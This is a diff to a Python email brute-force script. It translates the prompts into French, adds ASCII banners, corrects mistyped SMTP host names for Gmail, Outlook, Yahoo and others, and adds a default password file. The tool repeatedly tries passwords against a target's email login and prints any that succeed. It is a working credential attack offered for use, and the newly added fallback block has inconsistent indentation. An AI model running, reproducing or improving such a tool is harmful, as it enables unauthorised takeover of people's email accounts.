@@ -18,8 +18,8 @@ port = 587
 
 os.chdir('modules/')
 parser = argparse.ArgumentParser(description="Framework Hunner")
-parser.add_argument('login', help='Target email')
-parser.add_argument('password', help='Password list')
+parser.add_argument('login', help='Email de la cible')
+parser.add_argument('password', help='Liste des mots de passe')
 args = parser.parse_args()
 
 if args.login or args.password:
@@ -28,22 +28,33 @@ if args.login or args.password:
 	if os.path.exists(password_list):
 		file = open(password_list,'r')
 	else:
-		print(F+'File not exist'+E)
-		sys.exit(1)
+		print(F+'Le fichier n\'existe pas'+E)
+        if os.path.exists("pas.txt"):
+            file = open("pas.txt", 'r')
+        else:
+		    sys.exit(1)
 def banner():
 	text1 = '''
-Create: python3
-                                                    
-
+  ______ _____ _    _____ ___    
+  |  _  \  ___| |  |_   _/ _ \   
+  | | | | |__ | |    | |/ /_\ \  
+  | | | |  __|| |    | ||  _  |  
+  | |/ /| |___| |____| || | | |  
+  |___/ \____/\_____/\_/\_| |_/  Wallskors Security
 	'''
-	text2 = '''
-No module.
-                                                     
-	'''
+	text2 = E + F + """
+ ____  _____ ____  ____  _   _    _    _  _______ 
+|  _ \| ____|  _ \/ ___|| \ | |  / \  | |/ | ____|
+| |_) |  _| | | | \___ \|  \| | / _ \ | ' /|  _|  
+|  _ <| |___| |_| |___) | |\  |/ ___ \| . \| |___ 
+|_| \_|_____|____/|____/|_| \_/_/   \_|_|\_|_____|
+                                                  
+""" + E
 	if random.randrange(0,1) == 0:
 		print(text1)
 	else:
-		print(text2) 
+		print(text2)
+
 def clear():
 	os.system('clear')
 
@@ -51,7 +62,7 @@ def check_mail():
 	global serv
 	clear()
 	banner()
-	print(B+'Tipe BruteEmail:'+E)
+	print(B+'Type de compte :'+E)
 	print(H+"""
 		1) Gmail
 		2) Outlook
@@ -59,9 +70,9 @@ def check_mail():
 		4) At&T
 		5) Mail.com
 		6) Comcast
-		7) By hand
+		7) Saisir
 		"""+E)
-	ServerSmtp = input(W+'Xshell»Mail»ServerSmtp»'+E)
+	ServerSmtp = input(W+'Wallskors»Mail»ServerSmtp»'+E)
 	if int(ServerSmtp) == 1:
 		serv = 'smtp.gmail.com'
 		port = 587
@@ -69,26 +80,26 @@ def check_mail():
 		serv = 'smtp-mail.outlook.com'
 		port = 587
 	elif int(ServerSmtp) == 3:
-		serv = 'smtm.mail.yahoo.com'
+		serv = 'smtp.mail.yahoo.com'
 		port = 587
 	elif int(ServerSmtp) == 4:
-		serv = 'smtm.mail.att.net'
+		serv = 'smtp.mail.att.net'
 		port = 465
 	elif int(ServerSmtp) == 5:
-		serv = 'smtm.mail.com'
+		serv = 'smtp.mail.com'
 		port = 587
 	elif int(ServerSmtp) == 6:
-		serv = 'smtm.comcast.com'
+		serv = 'smtp.comcast.com'
 		port = 587
 	elif int(ServerSmtp) == 7:
-		serv = input('Enter smtp server (Exemple:smtp.gmail.com)')
-		port = input('Enter port smtp server (Default port: 587)')
+		serv = input('Entrez le serveur smtp (Exemple:smtp.gmail.com)')
+		port = input('Entrez le port du serveur smtp port (Defaut:587)')
 	else:
-		print('Error ')
+		print('Erreur...')
 		sys.exit(1)
 
 def brut():
-	print(F+'Memulai Bruteforce'+E)
+	print(F+'Attaque Bruteforce'+E)
 	try:
 		smtp = smtplib.SMTP(str(serv), int(port))
 		smtp.ehlo()
@@ -99,11 +110,11 @@ def brut():
 		try:
 			passw = line.strip('\r\n')
 			smtp.login(login, passw)
-			print(W+time.ctime()+B+' Sukses-> '+W+login+B+' password-> '+W+passw)
+			print(W+time.ctime()+B+' Succès-> '+W+login+B+' Mot de passe-> '+W+passw)
 			break
 			sys.exit(1)
 		except:
-			print(F + time.ctime() + E + ' Gagal ->'+E+login+E+'Password ->'+E+passw)
+			print(F + time.ctime() + E + ' Echec->'+E+login+E+' Mot de passe->'+E+passw)
 
 check_mail()
 t1 = threading.Thread(target=brut)
